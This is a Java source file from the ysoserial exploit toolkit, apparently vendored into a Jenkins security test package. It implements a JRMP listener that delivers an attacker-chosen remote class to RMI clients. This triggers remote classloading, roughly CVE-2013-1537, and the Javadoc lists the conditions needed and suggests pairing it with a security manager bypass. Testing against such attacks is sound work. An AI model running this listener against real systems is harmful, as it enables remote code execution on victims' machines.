/*
 * The MIT License
 *
 * Copyright (c) 2013 Chris Frohoff
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */

package jenkins.security.security218.ysoserial.exploit;



import java.net.URL;


/**
 * JRMP listener triggering RMI remote classloading
 * 
 * Opens up an JRMP listener that will deliver a remote classpath class to the calling client.
 * 
 * Mostly CVE-2013-1537 (presumably, does not state details) with the difference that you don't need
 * access to an RMI socket when you can deliver {@link ysoserial.payloads.JRMPClient}.
 * 
 * This only works if
 * - the remote end is running with a security manager
 * - java.rmi.server.useCodebaseOnly=false (default until 7u21) 
 * - the remote has the proper permissions to remotely load the class (mostly URLPermission)
 * 
 * and, of course, the payload class is then run under the security manager with a remote codebase
 * so either the policy needs to allow whatever you want to do in the payload or you need to combine
 * with a security manager bypass exploit (wouldn't be the first time).
 * 
 * @author mbechler
 *
 */
public class JRMPClassLoadingListener {

    public static final void main ( final String[] args ) {

        if ( args.length < 3 ) {
            System.err.println(JRMPClassLoadingListener.class.getName() + " <port> <url> <className>");
            System.exit(-1);
            return;
        }

        try {
            int port = Integer.parseInt(args[ 0 ]);
            System.err.println("* Opening JRMP listener on " + port);
            JRMPListener c = new JRMPListener(port, args[2], new URL(args[1]));
            c.run();
        }
        catch ( Exception e ) {
            System.err.println("Listener error");
            e.printStackTrace(System.err);
        }
    }   

}
